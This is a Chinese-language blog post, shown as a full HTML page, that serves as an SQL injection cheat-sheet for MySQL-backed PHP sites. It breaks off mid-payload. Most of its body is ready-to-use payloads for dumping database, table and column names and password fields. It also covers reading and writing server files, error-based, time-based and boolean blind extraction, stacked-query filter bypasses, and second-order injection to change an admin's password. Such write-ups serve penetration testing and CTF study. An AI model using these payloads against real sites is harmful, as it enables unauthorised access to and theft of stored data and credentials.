<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>SQL Injection Hacking Flow - Resek&#039;s Kingdom</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Resek&#039;s Kingdom"><meta name="msapplication-TileImage" content="/img/favicon.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Resek&#039;s Kingdom"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="sql 注入步骤0x00.判断注入点1.如果目标有 get 注入，则会在 url 上有明显传参的注入点，比方说： 1&amp;#x2F;index.php?id&amp;#x3D;1  如果没有在目标 url 上发现明显的 get 注入，则很有可能是 post 注入，在 post 里边传参就好了 2.通过在传参的数字或是字符串后边加单引号，看会不会框架还在但数据不在了，再加上井号，看不在的数据会不会恢复，以此来判断是否有注入点 3."><meta property="og:type" content="blog"><meta property="og:title" content="SQL Injection Hacking Flow"><meta property="og:url" content="https://resek4.github.io/2019/12/11/sql%E6%B3%A8%E5%85%A5/"><meta property="og:site_name" content="Resek&#039;s Kingdom"><meta property="og:description" content="sql 注入步骤0x00.判断注入点1.如果目标有 get 注入，则会在 url 上有明显传参的注入点，比方说： 1&amp;#x2F;index.php?id&amp;#x3D;1  如果没有在目标 url 上发现明显的 get 注入，则很有可能是 post 注入，在 post 里边传参就好了 2.通过在传参的数字或是字符串后边加单引号，看会不会框架还在但数据不在了，再加上井号，看不在的数据会不会恢复，以此来判断是否有注入点 3."><meta property="og:locale" content="en_US"><meta property="og:image" content="https://resek4.github.io/img/og_image.png"><meta property="article:published_time" content="2019-12-10T16:00:00.000Z"><meta property="article:modified_time" content="2023-01-27T09:03:13.437Z"><meta property="article:author" content="Resek4"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://resek4.github.io/2019/12/11/sql%E6%B3%A8%E5%85%A5/"},"headline":"SQL Injection Hacking Flow","image":["https://resek4.github.io/img/og_image.png"],"datePublished":"2019-12-10T16:00:00.000Z","dateModified":"2023-01-27T09:03:13.437Z","author":{"@type":"Person","name":"Resek4"},"publisher":{"@type":"Organization","name":"Resek's Kingdom","logo":{"@type":"ImageObject","url":"https://resek4.github.io/img/logo.jpg"}},"description":"sql 注入步骤0x00.判断注入点1.如果目标有 get 注入，则会在 url 上有明显传参的注入点，比方说： 1&#x2F;index.php?id&#x3D;1  如果没有在目标 url 上发现明显的 get 注入，则很有可能是 post 注入，在 post 里边传参就好了 2.通过在传参的数字或是字符串后边加单引号，看会不会框架还在但数据不在了，再加上井号，看不在的数据会不会恢复，以此来判断是否有注入点 3."}</script><link rel="canonical" href="https://resek4.github.io/2019/12/11/sql%E6%B3%A8%E5%85%A5/"><link rel="alternate" href="https://resek4.github.io/atom.xml" title="Resek&#039;s Kingdom" type="application/atom+xml"><link rel="icon" href="/img/favicon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/xt256.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Oxanium:wght@300;400;600&amp;family=Roboto+Mono"><link rel="stylesheet" href="/css/cyberpunk.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 6.2.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.jpg" alt="Resek&#039;s Kingdom" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Resek4/resek4.github.io"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2019-12-10T16:00:00.000Z" title="12/11/2019, 12:00:00 AM">2019-12-11</time></span><span class="level-item">Updated&nbsp;<time dateTime="2023-01-27T09:03:13.437Z" title="1/27/2023, 5:03:13 PM">2023-01-27</time></span><span class="level-item"><a class="link-muted" href="/categories/Penetration/">Penetration</a></span><span class="level-item">20 minutes read (About 2934 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">SQL Injection Hacking Flow</h1><div class="content"><h1 id="sql-注入步骤"><a href="#sql-注入步骤" class="headerlink" title="sql 注入步骤"></a>sql 注入步骤</h1><h2 id="0x00-判断注入点"><a href="#0x00-判断注入点" class="headerlink" title="0x00.判断注入点"></a>0x00.判断注入点</h2><p>1.如果目标有 get 注入，则会在 url 上有明显传参的注入点，比方说：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>如果没有在目标 url 上发现明显的 get 注入，则很有可能是 post 注入，在 post 里边传参就好了</p>
<p>2.通过在传参的数字或是字符串后边加单引号，看会不会框架还在但数据不在了，再加上井号，看不在的数据会不会恢复，以此来判断是否有注入点</p>
<p>3.如果第二步不成功，可以使用 id&#x3D;1 and 1&#x3D;1 与 id&#x3D;1 and 1&#x3D;2 来看两次页面是否有不同的回显，有的话说明 and 后的语句被执行了，有注入。</p>
<p>4.个别情况，可以使用 id&#x3D;1 and sleep(5)来看，如果有 5 秒延迟，说明有注入。</p>
<span id="more"></span>

<h2 id="0x01-使用-order-by-语句来判断列数"><a href="#0x01-使用-order-by-语句来判断列数" class="headerlink" title="0x01.使用 order by 语句来判断列数"></a>0x01.使用 order by 语句来判断列数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 4%23</span></span><br></pre></td></tr></table></figure>

<p>可以使用二分法来推测列数</p>
<h2 id="0x02-判断回显点"><a href="#0x02-判断回显点" class="headerlink" title="0x02.判断回显点"></a>0x02.判断回显点</h2><p>从此时开始，就要使 url 前面的查询失效，只执行你 union select 的语句<br>方法是传一个错误数据将前面的查询失效，可以是 0 可以是负数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3,4%23</span></span><br></pre></td></tr></table></figure>

<p>找到回显点以后，可以使用 database(),user(),version()等函数来证明回显点的可用性</p>
<h2 id="0x03-查询数据库名"><a href="#0x03-查询数据库名" class="headerlink" title="0x03.查询数据库名"></a>0x03.查询数据库名</h2><font size="4">
可以使用 group_concat()函数来将多列数据整合到一列

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,(select group_concat(schema_name) from information_schema.schemata),4%23</span></span><br></pre></td></tr></table></figure>

</font>

<h2 id="0x04-查询表名"><a href="#0x04-查询表名" class="headerlink" title="0x04.查询表名"></a>0x04.查询表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=0x746573745f736368656d61),4%23</span></span><br></pre></td></tr></table></figure>

<p>查询表名时只需要做一次 where 限制，但是限制名字一定要用十六进制表示，并加上 0x</p>
<h2 id="0x05-查询列名"><a href="#0x05-查询列名" class="headerlink" title="0x05.查询列名"></a>0x05.查询列名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=0x746573745f736368656d61 and table_name=0x746573745f7461626c65),4%23</span></span><br></pre></td></tr></table></figure>

<p>查询列名时需要做两次 where 限制，一次是 table_schema（表的数据库名），一次是 table_name（表的名字），且都要用十六进制表示</p>
<h2 id="0x06-查询数据"><a href="#0x06-查询数据" class="headerlink" title="0x06.查询数据"></a>0x06.查询数据</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,(select group_concat(id,0x7c,password) from test_schema.test_table),4%23</span></span><br><span class="line"><span class="string">（不对可以尝试将test.schema的这个前缀去掉）</span></span><br></pre></td></tr></table></figure>

<p>在 group_concat()里写入要查询数据的列名，from 的表名也直接可以用无需转进制的本名表示了（数据库名.表名）</p>
<p>而且由此可见，group_concat 函数里可以通过加上十六进制的特殊符号来分隔列名，以达到分隔要查询的数据的效果</p>
<h1 id="sql-注入技巧"><a href="#sql-注入技巧" class="headerlink" title="sql 注入技巧"></a>sql 注入技巧</h1><ul>
<li>Bypass:</li>
</ul>
<p>(1)单引号或者别的什么字符：十六进制编码<code>(&#39;abc&#39;==0x616263)</code><br>(2)空格：<code>/**/</code></p>
<p>(3)关键字：预编译语句替换<br>(4)and 或 or：&amp;&amp; ||   或者将 and 或 or 用 ascii 编码后加上%（即变成字母的 url 编码进行绕过）<br>(5)’!&#x3D;’：’&lt;&gt;’<br>(6)’&#x3D;’<br>id &#x3D; 1：id between 1 and 1<br>like</p>
<h2 id="0x00-Tips"><a href="#0x00-Tips" class="headerlink" title="0x00.Tips"></a>0x00.Tips</h2><ul>
<li>sql 可以使用写文件</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,&quot;获得的值&quot;,<span class="number">3</span> <span class="keyword">into</span> outfile &quot;绝对路径&quot; <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>必须是绝对路径（路径要是斜杠不能是反斜杠\，不然会被当成转义）  </span><br><span class="line"><span class="number">2.</span>必须是最高权限（不一定是root） </span><br><span class="line"><span class="number">3.</span>使用读写文件时，my.ini 中的 mysqld 必须有 secure<span class="operator">-</span>file<span class="operator">-</span>priv 参数，如果没有必须加上，如果有，要不将写的文件放到这个参数的默认路径里，要不修改这个路径</span><br></pre></td></tr></table></figure>

<p>读文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,load_file(<span class="number">0x123123</span>),<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line">读文件时需要将绝对路径进行十六进制编码</span><br><span class="line">最后在load_file()的外层还可以包一个hex()，这样即便是中文，也可以后期解码</span><br><span class="line">这个路径对反斜杠没有要求</span><br></pre></td></tr></table></figure>

<ul>
<li><p>sqlmap 可以去跑一个页面的 php 文件（不带任何参数那种），然后加上–forms 参数来自动寻找页面可能存在的表单</p>
</li>
<li><p>虽然关键字不能被十六进制编码，但是查询的字符串可以进行十六进制编码，并等价于原字符串</p>
</li>
<li><p>注入时，先引号，然后万能密码，然后 order by，然后 union select 去正常注入。看中途回显要求，尝试堆叠，报错等其他注入途径</p>
</li>
<li><p>注入时如果需要有&#x3D;这样的字符，不知道全名的时候，&#x3D;可以换成 like，然后不知道的地方用% 通配，然后十六进制转换</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where table_schema like %all%    <span class="comment">//all那里再转成十六进制</span></span><br></pre></td></tr></table></figure>

<ul>
<li>可以使用 exists(select …)来排查过滤或者<b>暴力猜解表名</b></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span><span class="string">&#x27; and exists(select * from admin)--+   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//对admin进行burp爆破</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>注入时最好去抓包用-r 注入，因为这样可以带上 User-Agent 消息头</p>
</li>
<li><p>注入时有可能你加上–random-agent 这个自动更改消息头的参数会提高成功率</p>
</li>
<li><p>sql 注入的时候不光可注入 GET，POST，还可以抓包注入数据部分的参数（加 * ）</p>
</li>
<li><p>用不了 substr 可以用 mid 替换，效果一样</p>
</li>
<li><p>strstr()不区分大小写</p>
</li>
</ul>
<h2 id="0x01-亦或注入"><a href="#0x01-亦或注入" class="headerlink" title="0x01.亦或注入"></a>0x01.亦或注入</h2><p>当不知道注入时哪些参数被过滤的时候，可以使用亦或注入<br>亦或符号为^，其运算规则是相同为真，相异为假</p>
<p>注入时使用 length()函数进行判断，length()内部是被考察有可能过滤掉的参数<br>如果页面正常返回，则说明被参数过滤掉了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=<span class="number">5</span><span class="string">&#x27;^(length(&#x27;</span><span class="keyword">and</span><span class="string">&#x27;)!=0)%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">原理即是：如果and被过滤掉了，length(&#x27;</span><span class="keyword">and</span><span class="string">&#x27;)即为0,0!=0显然结果是0，而前面的值为真（&#x27;</span><span class="number">5</span><span class="string">&#x27;），二者相异，整个语句的值为1，所以页面正常返回</span></span><br></pre></td></tr></table></figure>

<p>如果%23（#）也被过滤掉了，可以尝试再加一次亦或</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=<span class="number">5</span><span class="string">&#x27;^(length(&#x27;</span><span class="keyword">and</span><span class="string">&#x27;)!=0)^&#x27;</span></span><br><span class="line"></span><br><span class="line">因为添加的后引号与php文件里的语句一旦合并,内部即形成了<span class="string">&#x27;&#x27;</span>（空值），所以显然为<span class="number">0</span>，与前面的结果<span class="number">1</span>还是相异的，所以也可以正常返回来判断过滤</span><br></pre></td></tr></table></figure>

<h2 id="0x02-报错注入"><a href="#0x02-报错注入" class="headerlink" title="0x02.报错注入"></a>0x02.报错注入</h2><p>报错注入前提是在后端代码有 Exception 这种异常处理的回显才能在 web 中用，不然即使能报错但是你不知道报错内容</p>
<p>报错注入有十种，详见：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a></p>
<p>最常用的是</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">floor</span>()</span><br><span class="line">updatexml()</span><br><span class="line">extractvalue()</span><br></pre></td></tr></table></figure>

<ul>
<li>updatexml()</li>
</ul>
<p>此函数格式为 updatexml(目标文件, 路径, 更改值);</p>
<p>而这里的路径必须是 XPath 格式的路径，我们可以利用传入非法路径（但是是一个合理的 sql 语句），来让 updatexml 报错，显示路径中 sql 语句执行后的内容，而目标文件与更改值可以是任意内容</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x776562313030322d32)),3) %23</span></span><br></pre></td></tr></table></figure>

<p>而现在的目的是为了让传入的路径不符合 XPath 路径格式，那就必须加一个让路径格式失效的字符，’#’或者’~’(0x7e)都行</p>
<p>所以现在要用到 concat()函数来将那个字符与后面的语句拼接起来</p>
<ul>
<li><p>extractvalue()与 updatexml()同理</p>
</li>
<li><p>floor()</p>
</li>
</ul>
<p>与 rand()随机数函数结合，floor()用于取整<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/zpy1998zpy/article/details/80650540">https://blog.csdn.net/zpy1998zpy/article/details/80650540</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/8472323.html">https://www.cnblogs.com/litlife/p/8472323.html</a></p>
<h2 id="0x03-可以使用语句辅助注入"><a href="#0x03-可以使用语句辅助注入" class="headerlink" title="0x03.可以使用语句辅助注入"></a>0x03.可以使用语句辅助注入</h2><h3 id="substr-str-start-long"><a href="#substr-str-start-long" class="headerlink" title="substr(str,start,long)"></a>substr(str,start,long)</h3><p>str 是待切分的字符串，start 是切分起始位置(下标从 1 开始)，long 是切分长度</p>
<h3 id="if-exp1-exp2-exp3"><a href="#if-exp1-exp2-exp3" class="headerlink" title="if(exp1,exp2,exp3)"></a>if(exp1,exp2,exp3)</h3><p>如果满足 exp1,那么执行 exp2,否则执行 exp3</p>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx<span class="string">&#x27; or if((substr((select database()),1,1)=&#x27;</span>c<span class="string">&#x27;),1,0) #　　　　#判断数据库第一个字符是否为c</span></span><br></pre></td></tr></table></figure>

<h3 id="语句替换"><a href="#语句替换" class="headerlink" title="语句替换"></a>语句替换</h3><p>如果逗号被过滤了，可以使用以下收发替换</p>
<blockquote>
<p>if(exp1, exp2, exp3) &#x3D;&#x3D;&#x3D;&#x3D;&gt; case when exp1 then exp2 else exp3 end</p>
</blockquote>
<p>substr(exp1,1, 1) &#x3D;&#x3D;&#x3D;&#x3D;&gt; substr(exp1) from 1 for 1</p>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx<span class="string">&#x27; or case when (substr((select database()) from 1 for 1)=&#x27;</span>c<span class="string">&#x27;) then 1 else 0 end #</span></span><br></pre></td></tr></table></figure>

<p>如果 substr 被过滤了，可以使用 LOCATE 函数</p>
<blockquote>
<p>返回子串 substr 在字符串 str 中的第 p os 位置后第一次出现的位置。如果 substr 不在 str 中返回 0</p>
</blockquote>
<p>ps：因为[[Mysql]]对大小写不敏感，所有写的时候用 locate(binary’S’, str, 1) 加个 binary 即可</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx<span class="string">&#x27; or if((locate(binary&#x27;</span>c<span class="string">&#x27;,(select database()),1)=1),1,0) #</span></span><br><span class="line"><span class="string">xx&#x27;</span> <span class="keyword">or</span> if((locate(<span class="type">binary</span><span class="string">&#x27;t&#x27;</span>,(<span class="keyword">select</span> database()),<span class="number">1</span>)<span class="operator">=</span><span class="number">2</span>),<span class="number">1</span>,<span class="number">0</span>) #</span><br></pre></td></tr></table></figure>

<h2 id="0x04-使用延迟注入"><a href="#0x04-使用延迟注入" class="headerlink" title="0x04.使用延迟注入"></a>0x04.使用延迟注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">基于sleep的延迟 </span><br><span class="line">xx<span class="string">&#x27; or if(length((select database()))&gt;1,sleep(5),1) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">基于笛卡尔乘积运算时间造成的时间延迟</span></span><br><span class="line"><span class="string">xx&#x27;</span> <span class="keyword">or</span> if(length((<span class="keyword">select</span> database()))<span class="operator">&gt;</span><span class="number">1</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.columns A,information_schema.columns p B,information_schema.columns C),<span class="number">1</span>) # </span><br><span class="line"></span><br><span class="line">基于benchmark的延迟 </span><br><span class="line">xx<span class="string">&#x27;or if(length((select database()))&gt;1,(select BENCHMARK(10000000,md5(&#x27;</span>a<span class="string">&#x27;))),1) #--大概会用2S时间</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<h2 id="0x05-堆叠注入"><a href="#0x05-堆叠注入" class="headerlink" title="0x05.堆叠注入"></a>0x05.堆叠注入</h2><blockquote>
<p>如果能看见源码，源码中有 multi_query()那就很有可能涉及堆叠注入</p>
</blockquote>
<p>只要是堆叠注入，那就可以使用 sql 的预定义语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">即在<span class="string">&#x27;后直接跟分号结束，然后跟sql语句，最后#收尾</span></span><br><span class="line"><span class="string">-1&#x27;</span>;<span class="keyword">show</span> databases;#</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;;show tables;#</span></span><br><span class="line"><span class="string">-1&#x27;</span>;<span class="keyword">show</span> columns <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;#</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;;show columns from `words`;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#注意，以上表名要加反引号``，反引号内的内容可以被作为子命令在其他命令中嵌套输出</span></span><br><span class="line"><span class="string">#例如：ping www.google.com == ping `www.google.com`</span></span><br></pre></td></tr></table></figure>

<p>如果可以使用堆叠注入，但是有一些关键字被过滤了(例如 select)<br>那么我们可以使用<b>预编译</b>的方法</p>
<blockquote>
<p>set 用于设置变量名和值</p>
</blockquote>
<p>prepare 用于预备一个语句，并赋予名称，以后可以引用该语句<br>execute 执行语句<br>deallocate prepare 用来释放掉预处理的语句</p>
<p>例如 payload:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prepare stmt from @sql;execute stmt;#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x06-更改表名列名为本身就能回显的来查询"><a href="#0x06-更改表名列名为本身就能回显的来查询" class="headerlink" title="0x06.更改表名列名为本身就能回显的来查询"></a>0x06.更改表名列名为本身就能回显的来查询</h2><p>语法如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改表名(将表名<span class="keyword">user</span>改为users)</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="keyword">user</span> rename <span class="keyword">to</span> users;</span><br><span class="line"></span><br><span class="line">修改列名(将字段名username改为name)</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users change uesrname name <span class="type">varchar</span>(<span class="number">30</span>);</span><br></pre></td></tr></table></figure>

<p>例如 payload:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#</span></span><br></pre></td></tr></table></figure>

<p>修改完后，可以直接使用万能密码得出 flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br></pre></td></tr></table></figure>

<h2 id="0x07-二次注入"><a href="#0x07-二次注入" class="headerlink" title="0x07.二次注入"></a>0x07.二次注入</h2><p>即通过某种方式得到源码后，发现程序对输入的地方做了过滤（比方说转义 addslashs），但是<b>通过注册</b>存到数据库里的内容却是不带 \ 的。而当我们再去修改密码时，修改的却是之前注册的恶意代码里真正用户的密码，例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注册时我们注册admin<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">但是存储时，程序加了\，变成了admin\&#x27;#</span></span><br><span class="line"><span class="string">但是在当我们用这个admin&#x27;</span><span class="comment">#登录后去修改密码时，内部的sql如下构造</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;123&#x27; where username=&#x27;admin&#x27;#&#x27;and password=&#x27;<span class="subst">$curr_pass</span>&#x27;&quot;</span></span><br><span class="line">即我们相当于是修改了admin的密码</span><br></pre></td></tr></table></figure>

<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and sleep(5)# </span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">2</span># </span><br></pre></td></tr></table></figure>

<p>因没有回显，所以一般注入的 select 没用，故通过 and 或者别的方式查询时加上一些特定函数，来一个一个爆破猜解数据库的某个字段的字符<br>可以使用 Burpsuite 或者二分法来定位字符</p>
<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>基于时间：</p>
<ul>
<li><p>sleep()</p>
</li>
<li><p>if()</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">猜表的数量：</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(5),1)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜表名字符数：</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> if(length(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))<span class="operator">=</span><span class="number">9</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)# </span><br><span class="line"></span><br><span class="line">猜表名第一个字符：</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select table_name from table_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97,sleep(5),1)#</span></span><br></pre></td></tr></table></figure>

<p>基于布尔：</p>
<ul>
<li><p>length()</p>
</li>
<li><p>ascii()</p>
</li>
<li><p>mid()</p>
</li>
<li><p>substr()</p>
</li>
<li><p>count()</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">猜表的数量：</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=1#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜表长度：</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">1</span>#</span><br><span class="line"></span><br><span class="line">limit i,n  限制返回结果的数量</span><br><span class="line">i:返回结果的索引值</span><br><span class="line">n:返回结果的数量</span><br><span class="line"></span><br><span class="line">猜表名第一个字符：</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 